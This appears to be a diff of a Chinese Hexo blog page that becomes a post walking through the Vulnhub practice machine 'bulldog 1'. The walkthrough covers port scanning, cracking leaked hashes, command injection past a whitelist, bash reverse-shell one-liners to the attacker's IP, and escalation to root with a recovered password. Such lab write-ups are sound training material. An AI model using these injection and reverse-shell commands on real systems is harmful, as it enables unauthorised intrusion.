@@ -20,30 +20,50 @@
     var CONFIG = {"hostname":"www.budtit.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="budtit&#39;blog">
-<meta property="og:url" content="http://www.budtit.com/index.html">
+  <meta name="description" content="测试环境靶机难度： 初级攻击机：macos靶机：bulldog 1  下载地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub渗透测试（一）：bulldog1">
+<meta property="og:url" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/index.html">
 <meta property="og:site_name" content="budtit&#39;blog">
-<meta property="og:description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
+<meta property="og:description" content="测试环境靶机难度： 初级攻击机：macos靶机：bulldog 1  下载地址">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/1.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/2.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/3.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/4.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/5.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/7.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/6.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/8.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/9.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/10.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/11.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/12.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/13.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/14.png">
+<meta property="og:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/15.png">
+<meta property="article:published_time" content="2020-11-09T09:13:07.000Z">
+<meta property="article:modified_time" content="2020-11-12T13:51:06.950Z">
 <meta property="article:author" content="Budtit">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/1.png">
 
-<link rel="canonical" href="http://www.budtit.com/">
+<link rel="canonical" href="http://www.budtit.com/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>budtit'blog</title>
+  <title>Vulnhub渗透测试（一）：bulldog1 | budtit'blog</title>
   
 
 
@@ -157,84 +177,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.budtit.com/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/clever.png">
-      <meta itemprop="name" content="Budtit">
-      <meta itemprop="description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="budtit'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/" class="post-title-link" itemprop="url">mac升级node.js到最新版</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-12-21 21:26:16 / 修改时间：21:46:46" itemprop="dateCreated datePublished" datetime="2020-12-21T21:26:16+08:00">2020-12-21</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hexo/" itemprop="url" rel="index"><span itemprop="name">Hexo</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Mac 升级nodejs到最新版</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -250,10 +196,9 @@
       <meta itemprop="name" content="budtit'blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/" class="post-title-link" itemprop="url">Vulnhub渗透测试（一）：bulldog1</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          Vulnhub渗透测试（一）：bulldog1
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -292,111 +237,137 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>靶机难度： 初级<br>攻击机：macos<br>靶机：bulldog 1  <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bulldog-1,211/">下载地址</a></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
+        <h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>靶机难度： 初级<br>攻击机：macos<br>靶机：bulldog 1  <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/bulldog-1,211/">下载地址</a></p>
+<a id="more"></a>
+
+<h2 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h2><h3 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h3><p>virtualbox启动bulldog环境，界面给出了靶机IP地址。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/1.png"></p>
+</div>
+
+
+<p>使用nmap扫描靶机开启的端口和服务。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/2.png"></p>
+</div>
+
+
+<p>可以看到80和8080端口有web服务，访问看看。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/3.png"></p>
+</div>
+
+
+<h3 id="2-漏洞挖掘"><a href="#2-漏洞挖掘" class="headerlink" title="2.漏洞挖掘"></a>2.漏洞挖掘</h3><p>使用AWVS对目标站点进行扫描，查看目录结构。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/4.png"></p>
+</div>
+
+<p>目录不多挨个查看，admin目录下是登陆页面，注入和绕过简单测了一下没发现有漏洞。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/5.png"></p>
+</div>
+
+
+<p>DEV目录下大篇的英文得到信息：网站没有php，纯django开发，其中有一个shell界面显示要先进行身份验证，并在网页源码中发现邮箱地址和加密密码。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/7.png"><br><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/6.png"></p>
+</div>
+
+
+<p>对七条密文进行md5解密，只有两条能解出来😩。</p>
+<ul>
+<li>d8b8dd5e7f000b8dea26ef8428caf38c04466b3e–&gt;bulldoglover</li>
+<li>ddf45997a7e18a25ad5f5cf222da64814dd060d5–&gt;bulldog</li>
+</ul>
+<p>利用前面的邮箱用户名和解密后的密码尝试进行登陆，登录成功但是提示无操作权限。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/8.png"></p>
+</div>
+
+
+<p>登录后思路就断了，翻来翻去发现前面的shell界面登录后身份验证就通过了，利用<code>&amp;&amp;</code>绕过白名单，确定此处存在命令注入。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/9.png"></p>
+</div>
+
+<p>攻击机利用nc监听端口，shell界面使用<code>ls &amp;&amp; bash -i &gt;&amp; /dev/tcp/192.168.0.7/12345 0&gt;&amp;1</code>反弹shell结果。。。。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/10.png"></p>
+</div>
+
+<p>最后利用echo使用<code>echo “bash -i &gt;&amp; /dev/etc/192.168.0.7/1235 0&gt;&amp;1” | bash</code>成功进行反弹。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/11.png"></p>
+</div>
+
+<h3 id="3-权限提升"><a href="#3-权限提升" class="headerlink" title="3.权限提升"></a>3.权限提升</h3><p>查看/etc/passwd 发现名为bulldogadmin和django的用户，用<code>find / -user bulldogadmin 2&gt;/dev/null</code>列出用户文件。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/12.png"></p>
+</div>
+
+<p>查看/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp文件</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/13.png"></p>
+</div>
+
+<p>发现都是str，利用<code>strings</code>查看，反复分析后发现其中此处有问题，拼接后password被h打断，删除前后的h后得到字符串<code>SUPERultimatePASSWORDyouCANTget</code>。</p>
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/14.png"></p>
+</div>
+想到23端口开启了ssh，于是ssh远程连接，用户名为bulldogadmin和django，密码用`SUPERultimatePASSWORDyouCANTget`分别尝试，django成功登陆，再用`sudo su -`将权限提升为root权限。
+
+<div align="center">
+
+<p><img src="/2020/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)bulldog/15.png"></p>
+</div>
+
+
+
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/vulnhub/" rel="tag"># vulnhub</a>
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.budtit.com/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/clever.png">
-      <meta itemprop="name" content="Budtit">
-      <meta itemprop="description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="budtit'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/" class="post-title-link" itemprop="url">快速搭建hexo博客</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-11-14 14:04:02" itemprop="dateCreated datePublished" datetime="2019-11-14T14:04:02+08:00">2019-11-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-12-21 21:44:52" itemprop="dateModified" datetime="2020-12-21T21:44:52+08:00">2020-12-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Hexo/" itemprop="url" rel="index"><span itemprop="name">Hexo</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/" rel="prev" title="快速搭建hexo博客">
+      <i class="fa fa-chevron-left"></i> 快速搭建hexo博客
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/MAC%E5%8D%87%E7%BA%A7node-js%E5%88%B0%E6%9C%80%E6%96%B0%E7%89%88/" rel="next" title="mac升级node.js到最新版">
+      mac升级node.js到最新版 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -450,6 +421,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="nav-number">2.</span> <span class="nav-text">测试过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">2.1.</span> <span class="nav-text">1.信息搜集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="nav-number">2.2.</span> <span class="nav-text">2.漏洞挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">2.3.</span> <span class="nav-text">3.权限提升</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
